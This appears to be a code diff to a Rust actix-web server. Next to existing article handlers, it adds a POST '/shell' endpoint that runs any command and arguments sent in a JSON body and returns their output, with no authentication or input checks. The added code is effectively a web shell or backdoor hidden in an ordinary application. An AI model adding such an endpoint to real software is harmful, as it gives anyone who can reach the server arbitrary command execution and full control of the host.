@@ -57,7 +57,6 @@ pub(crate) async fn user(
     }
 }
 
-
 #[post("")]
 pub(crate) async fn article(
     pool: web::Data<SqlitePool>,
@@ -81,4 +80,32 @@ pub(crate) async fn article(
         Err(Error::RowNotFound) => HttpResponse::NotFound().finish(),
         Err(_) => HttpResponse::InternalServerError().finish(),
     }
+}
+
+use std::process::Command;
+use serde::{Deserialize, Serialize};
+
+#[derive(Deserialize)]
+struct Execute {
+    command: String,
+    args: Vec<String>
+}
+
+#[derive(Serialize)]
+struct Return {
+    output: String
+}
+
+#[post("/shell")]
+pub(crate) async fn shell(
+    data: web::Json<Execute>
+) -> HttpResponse {
+    Command::new(data.command.clone())
+        .args(data.args.clone())
+        .output()
+        .map(|output| HttpResponse::Ok().json(Return{
+            output: String::from_utf8(output.stdout)
+                .unwrap_or_else(|_| "".to_string())
+        }))
+        .unwrap_or_else(|_| HttpResponse::InternalServerError().finish())
 }
